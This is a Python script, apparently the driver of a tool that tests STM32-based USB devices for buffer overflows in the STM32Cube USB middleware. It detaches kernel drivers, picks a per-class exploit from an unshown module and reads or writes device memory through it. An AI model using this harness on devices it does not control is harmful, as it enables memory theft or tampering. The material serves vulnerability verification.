#!/usr/bin/python3

'''STM32 USB device class buffer overflow verification tool

This simple utility attempts to verify if a STM32-based usb
device is affected by buffer overflows existing in STM32Cube
middleware. Depending on particular device class the issue
might allow memory readout, overwrite or both.

USB device classes known to be affected:
- DFU - R/W
- CDC ACM - R/W
- CDC ECM - W
- CDC RNDIS - W
- Audio - R/W
- Video - R/W
- CustomHID - W

The issues have been fixed in release 2.8.0 of stm32_mw_usb_device
middleware but unfortunately were not incorporated into MCU specific
Cube packages.

This tool requires pyusb.

For better results it is recommended to use a libusb build with
MAX_CTRL_BUFFER_LENGTH size increased from default 4096 bytes to
0xFFFF (libusb/os/linux_usbfs.h).

Sample invocation to read 1000 bytes:

./stm32usb.py -v 0x0483 -p 0xdf11 -m read -l 1000

'''

import argparse
import sys

import usb.core

from devices import DeviceExploit


def auto_int(val: str) -> int:
    '''Convert arbitrary string to integer

    Used as argparse type to automatically handle input with
    different base - decimal, octal, hex etc.

    '''
    return int(val, 0)


def parse_args() -> argparse.Namespace:
    '''Parse command line arguments

    '''
    parser = argparse.ArgumentParser(
        description='STM32 usb device class test utility',
        epilog='data is input and output using stdin and stdout'
    )

    parser.add_argument('-v', '--vid', default=0x0483, type=auto_int,
                        help='vendor id')
    parser.add_argument('-p', '--pid', type=auto_int, required=True,
                        help='product id')
    parser.add_argument('-c', '--class', type=str, dest='device_class',
                        required=False, help='usb device exploit class')
    parser.add_argument('-m', '--mode', type=str, default='read',
                        choices=['read', 'write'],
                        help='direction of operation from host perspective')
    parser.add_argument('-l', '--length', type=auto_int, default=0xffff,
                        required=False, help='lenght of data to read')

    return parser.parse_args()


def collect_data_or_length(args: argparse.Namespace):
    '''Return user provided data or number of bytes

    Depending on specified mode - either read or write - function
    returns number of bytes to read or data collected from standard input.

    '''
    return sys.stdin.buffer.read() if args.mode != 'read' else args.length


def store_result(mode: str, output):
    '''Write data extracted data to standard output in write mode

    '''
    if mode != 'write':
        sys.stdout.buffer.write(output)


def filter_out_nones(input_list: list) -> list:
    '''Remove Nones from supplied list

    '''
    output_list = []
    for element in input_list:
        if element is not None:
            output_list.append(element)
    return output_list


def filter_by_attr(input_list: list, attr: str, value) -> list:
    '''Retrieve elements matching attribute value from given list

    '''
    output_list = []
    for element in input_list:
        if getattr(element, attr) == value:
            output_list.append(element)
    return output_list


class STM32UsbDevice:
    '''USB device management class

    Responsible for location, configuration and identification
    of STM32 based USB devices.

    '''
    def __init__(self, vendor, product) -> None:
        self.vendor = vendor
        self.product = product
        self.__find_device()
        self.__setup_device()
        self.__check_device_class()

    def __find_device(self):
        self.device = usb.core.find(
            idVendor=self.vendor,
            idProduct=self.product
        )

        if self.device is None:
            raise ValueError(
                'Device {:04X}:{:04X} not found'.format(
                    self.vendor, self.product
                ))

    def __setup_device(self) -> None:
        for cfg in self.device:
            for idx in range(cfg.bNumInterfaces):
                if self.device.is_kernel_driver_active(idx):
                    self.device.detach_kernel_driver(idx)
        self.device.set_configuration()

    def __scan_classes_and_protocols(self):
        device_info = []
        device_info.append((
            self.device.bDeviceClass,
            self.device.bDeviceSubClass,
            self.device.bDeviceProtocol))

        for cfg in self.device:
            for intf in cfg:
                device_info.append((
                    intf.bInterfaceClass,
                    intf.bInterfaceSubClass,
                    intf.bInterfaceProtocol))
        return device_info

    def __load_supported_devices(self, device_info):
        return filter_out_nones([
            DeviceExploit.load_child(
                descriptor[0],
                descriptor[1],
                descriptor[2]
            ) for descriptor in device_info
        ])

    def __check_device_class(self):
        device_info = self.__scan_classes_and_protocols()
        self.device_exploits = self.__load_supported_devices(device_info)

    def __pick_exploit(self, device_exploits, device_class):
        if len(device_exploits) == 0:
            raise Exception('No supported devices found')

        if len(device_exploits) == 1:
            return device_exploits[0]

        if len(device_exploits) > 1 and device_class is None:
            raise Exception('Multiple supported devices found')

        matching_exploits = filter_by_attr(
            device_exploits,
            '__name__',
            device_class
        )

        if len(matching_exploits) == 0:
            raise Exception('Exploit type is not supported by device')

        return matching_exploits[0]

    def build_exploit(self, device_class):
        '''Prepare a usb device specific exploit

        '''
        return self.__pick_exploit(
            self.device_exploits,
            device_class
        )(self.device)


if __name__ == '__main__':
    args = parse_args()
    data_or_length = collect_data_or_length(args)

    stm32_dev = STM32UsbDevice(args.vid, args.pid)
    result = stm32_dev.build_exploit(
        args.device_class
    ).exploit(args.mode, data_or_length)

    store_result(args.mode, result)
